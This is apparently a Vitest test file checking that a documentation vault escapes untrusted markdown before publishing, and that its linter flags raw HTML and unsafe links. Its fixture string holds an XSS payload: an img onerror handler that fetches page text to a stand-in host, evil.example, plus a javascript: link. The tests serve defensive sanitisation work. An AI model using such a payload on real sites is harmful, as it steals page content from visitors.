import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { inertMarkdown, Vault } from "@scriptorium/core";
import { fileGapNote, organizeInboxFile } from "@scriptorium/curator";
import { lintDoc, publishDoc } from "@scriptorium/scribe";

/**
 * The vault is published as two sites that render raw HTML and any link scheme. Text nobody
 * vouched for (a typed question, an attached PRD, a model's draft) is written inert.
 */
const HOSTILE = `What is the SSO SLA? <img src=x onerror="fetch('//evil.example/?'+document.body.innerText)"> [our policy](javascript:alert(1))`;

describe("inert markdown", () => {
  it("a tag can't open and a non-web link loses its target; code, web links and prose stay", () => {
    const out = inertMarkdown(HOSTILE);
    expect(out).not.toMatch(/<img|\]\(javascript:/i);
    expect(out).toContain("&lt;img");
    const kept = "Press `<kbd>Ctrl</kbd>`, see [the guide](https://docs.beacon.example) or <https://x.example>, mail [us](mailto:a@b.example), a < b.\n```html\n<script>keep()</script>\n```";
    expect(inertMarkdown(kept)).toBe(kept);
  });

  it("lint sends back a draft with raw HTML or a link that doesn't go to the web", () => {
    const codes = lintDoc(`# T\n\n## Overview\n\n${HOSTILE}\n\n## Steps\n\n1. Go.`).map((finding) => finding.code);
    expect(codes).toContain("raw-html");
    expect(codes).toContain("unsafe-link");
    expect(lintDoc("# T\n\n## Overview\n\nUse `<b>` for bold; x<y.\n\n## Steps\n\n1. See [docs](https://x.example).").map((finding) => finding.code)).toEqual([]);
  });

  it("a gap note, a filed PRD and a published doc reach the vault inert", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "scriptorium-inert-"));
    const vault = new Vault(root);
    await vault.ensure();
    const auditFile = path.join(root, "audit.jsonl");
    const gap = await fileGapNote(vault, { question: HOSTILE, missing: "SSO <script>x</script>", askedBy: "U1", auditFile });
    await vault.writeNote("_inbox/sso.md", `# SSO\n\n## Requirements\n\n${HOSTILE}`, { kind: "prd", feature: "SSO" });
    const filed = await organizeInboxFile(vault, "_inbox/sso.md");
    const doc = await publishDoc({ vault, auditFile, repoRoot: root, markdown: `# SSO\n\n${HOSTILE}`, approvedBy: "PM", slug: "sso" });
    for (const relPath of [gap.relPath, filed.to as string, doc]) {
      const raw = await fs.readFile(vault.abs(relPath), "utf8");
      expect(raw, relPath).not.toMatch(/<img|<script|\]\(javascript:/i);
    }
    await fs.rm(root, { recursive: true, force: true, maxRetries: 5 });
  });
});
